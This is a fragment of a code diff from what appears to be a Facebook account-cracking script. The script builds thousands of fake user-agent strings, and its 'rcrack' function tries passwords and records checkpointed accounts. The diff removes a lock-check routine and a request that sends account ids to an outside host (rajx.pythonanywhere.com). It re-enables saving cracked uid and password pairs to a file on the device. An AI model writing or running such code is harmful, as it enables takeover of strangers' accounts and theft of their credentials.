@@ -190,16 +190,7 @@ for xd in range(10000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
     
-#-------checker------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
+
 
 # APK CHECK
 def xxr():
@@ -302,12 +293,8 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
-                if 'LOCK' in res:
-                    return 'LOCK'
-                else:
-                ##print('\r\r\33[1;31m [HASAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                ##open('/sdcard/HASAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('\r\r\33[1;31m [HASAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/HASAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
